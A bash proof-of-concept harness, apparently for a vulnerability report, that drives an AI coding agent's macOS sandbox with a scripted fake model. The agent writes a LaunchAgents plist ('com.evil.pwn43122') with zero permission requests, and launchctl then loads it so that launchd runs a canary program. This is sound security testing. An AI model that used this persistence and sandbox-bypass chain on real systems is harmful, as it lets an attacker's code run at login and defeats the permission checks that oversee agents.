#!/bin/bash
# EN-0322 判据② darwin 消费腿 真机(GitHub Actions macos-latest)装置。
# 目的: 在 REAL macOS 上用 REAL sandbox-cli-darwin 二进制验证两跳:
#   ① 写腿: 沙箱生效会话一次 Write 落 ~/Library/LaunchAgents/*.plist ⇒ permission requests=0;
#   ② 消费腿: 真 launchd 加载该 RunAtLoad plist 并执行攻击者程序(canary)。
# 假模型(OpenAI 兼容 SSE)只听 127.0.0.1 机械回放, 不参与任何安全判定; 零出网到目标。
set -u
ROOT=$(cd "$(dirname "$0")" && pwd)
BIN="${CB_BIN:?CB_BIN unset}"
RUNROOT="$HOME/evotest43122/darwin"
mkdir -p "$RUNROOT/proj/.codebuddy" "$RUNROOT/home/Library/LaunchAgents"
OUT="$RUNROOT"
STAMP=$(date +%H%M%S)
SAVE="$ROOT/macout/darwin-write-consume-$STAMP"
mkdir -p "$SAVE"

# 沙箱生效: 项目级 settings.json 开 sandbox
printf '{"sandbox": {"enabled": true}}' > "$OUT/proj/.codebuddy/settings.json"
cp "$OUT/proj/.codebuddy/settings.json" "$SAVE/settings.json"

MODEL_PORT=$((22000 + RANDOM % 8000))
COLLECT_PORT=$((MODEL_PORT + 1500))
PY="$(command -v python3 || command -v python)"
NODEBIN="$(command -v node)"

# 占位符替换(在已解析 JSON 对象上做)
"$PY" - "$ROOT/maccases/darwin-launchagent-write.json" "$SAVE/script.resolved.json" "$OUT" "$RUNROOT/home" <<'PYEOF'
import json, sys
src, dst, out, home = sys.argv[1:5]
script = json.load(open(src, encoding='utf-8'))
def sub(o):
    if isinstance(o, str):
        return o.replace('__HOME__', home).replace('__OUT__', out)
    if isinstance(o, list):
        return [sub(x) for x in o]
    if isinstance(o, dict):
        return {k: sub(v) for k, v in o.items()}
    return o
json.dump(sub(script), open(dst, 'w', encoding='utf-8'), indent=1)
print('RESOLVED_OK', dst)
PYEOF

PROMPT=$(cat "$ROOT/maccases/prompt.txt")
export HOME="$RUNROOT/home"
export CODEBUDDY_CONFIG_DIR="$RUNROOT/home/.workbuddy"
export WORKBUDDY_CONFIG_DIR="$RUNROOT/home/.workbuddy"
export CODEBUDDY_BASE_URL="http://127.0.0.1:$MODEL_PORT"
export CODEBUDDY_API_KEY=stub-key-43122
export CODEBUDDY_DISABLE_TELEMETRY=1
export CODEBUDDY_TELEMETRY_DISABLED=1
export CI=1
export P2_SCRIPT1="$SAVE/script.resolved.json"
export P2_SCRIPT2="$SAVE/script.resolved.json"
export P2_PROMPT="继续下一步"

"$PY" "$ROOT/harness/fake_model_write.py" "$MODEL_PORT" "$COLLECT_PORT" "$SAVE/script.resolved.json" "$SAVE" &
FPID=$!
sleep 2
"$NODEBIN" "$ROOT/harness/acp_client.mjs" "$BIN" "$OUT/proj" "$PROMPT" "$SAVE/acp.log" "${WAIT_MS:-45000}" "${STRATEGY:-allow}" || echo "acp_client exit=$?"
kill $FPID 2>/dev/null

PLIST="$RUNROOT/home/Library/LaunchAgents/com.evil.pwn43122.plist"
echo "=== permission requests: $(grep -c 'session/request_permission' "$SAVE/acp.log" 2>/dev/null || echo 0) ===" | tee -a "$SAVE/case.txt"
echo "=== 落盘检查 ===" | tee -a "$SAVE/case.txt"
stat -c 'PLIST_STAT %a %s %n' "$PLIST" 2>&1 | tee -a "$SAVE/case.txt"
cp "$PLIST" "$SAVE/com.evil.pwn43122.plist" 2>/dev/null
grep -o 'STATS permission#[0-9]*[^"]\{0,220\}' "$SAVE/acp.log" 2>/dev/null | head -6 | tee -a "$SAVE/case.txt"
grep -hoE 'decide_file .*' "$SAVE/acp.log" "$RUNROOT/home/.workbuddy/logs/"*/*/*.log 2>/dev/null | head -5 | tee -a "$SAVE/case.txt"
grep -hoE 'SandboxFinalState[^"]{0,200}|SandboxRuleSync[^"]{0,160}' "$SAVE/acp.log" 2>/dev/null | head -5 | tee -a "$SAVE/case.txt"

# ================= 消费腿: 真 launchd 加载 RunAtLoad plist =================
# bootstrap gui/<uid> 该 plist = 登录会话枚举 ~/Library/LaunchAgents 时对每个 plist 做的加载操作。
echo "=== 消费腿: launchctl 加载 ===" | tee -a "$SAVE/case.txt"
if [ -f /tmp/darwin_canary_43122.txt ]; then
  echo "PRE_BOOTSTRAP_CANARY_PRESENT" | tee -a "$SAVE/case.txt"
else
  echo "PRE_BOOTSTRAP_CANARY_ABSENT" | tee -a "$SAVE/case.txt"
fi
rm -f /tmp/darwin_canary_43122.txt
launchctl print gui/$(id -u) >/dev/null 2>&1 && DOM="gui/$(id -u)" || DOM="user/$(id -u)"
echo "LAUNCHD_DOMAIN=$DOM" | tee -a "$SAVE/case.txt"
launchctl bootstrap "$DOM" "$PLIST" 2>&1 | tee -a "$SAVE/case.txt" || launchctl load "$PLIST" 2>&1 | tee -a "$SAVE/case.txt"
launchctl print "$DOM/com.evil.pwn43122" 2>&1 | head -30 | tee -a "$SAVE/case.txt"
for i in $(seq 1 15); do
  [ -f /tmp/darwin_canary_43122.txt ] && break
  sleep 1
done
echo "=== canary ===" | tee -a "$SAVE/case.txt"
if [ -f /tmp/darwin_canary_43122.txt ]; then
  echo "CANARY_PRESENT" | tee -a "$SAVE/case.txt"
  cat /tmp/darwin_canary_43122.txt | tee -a "$SAVE/case.txt"
  cp /tmp/darwin_canary_43122.txt "$SAVE/" 2>/dev/null
else
  echo "CANARY_MISSING" | tee -a "$SAVE/case.txt"
fi
# 阴性对照: 干净 LaunchAgents 目录不放文件 ⇒ 不 bootstrap ⇒ 不应有 canary(此处仅记录)
echo "MAC_DONE" | tee -a "$SAVE/case.txt"
